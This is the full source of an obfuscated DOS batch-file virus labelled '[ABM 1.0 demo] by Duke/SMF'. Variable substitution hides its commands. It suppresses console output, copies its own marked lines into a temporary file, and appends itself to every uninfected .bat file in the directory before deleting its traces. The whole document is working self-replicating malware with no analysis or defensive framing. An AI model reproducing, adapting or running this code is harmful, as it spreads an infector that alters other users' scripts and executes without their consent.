;@set qc=ctty
;@set hr=nul
;@%qc% %hr%
;@set so=if
;@set ag="%0
;@set qc="
;@set lkg=goto
;@set bb=;@
;@%so% %ag%==%qc% %lkg% %bb%
;@set qc="%1
;@set hr="@
;@set ag=;@z
;@%so% %qc%==%hr% %lkg% %ag%
;@set qc=echo.
;@set hcl=@.bat
;@%qc%>%hcl%
;@set cl=find
;@set slx=";@"
;@set qc=%0
;@%cl% %slx%<%qc%>>%hcl%
;@set qc=for
;@set ejj=%%b
;@set hr=in
;@set ag=(*.bat)
;@set syy=do
;@set uo=call
;@set mrm=@
;@%qc% %ejj% %hr% %ag% %syy% %uo% %mrm% %mrm% %ejj%
;@set qc=del
;@set hr=@.*
;@%qc% %hr%
;@%lkg% %bb%
:;@z [ABM 1.0 demo] by Duke/SMF
;@set vc=%2
;@%cl% %slx%<%vc%
;@set qc=errorlevel
;@set hr=1
;@set ag=type
;@%so% %qc% %hr% %ag% %hcl%>>%vc%
:;@
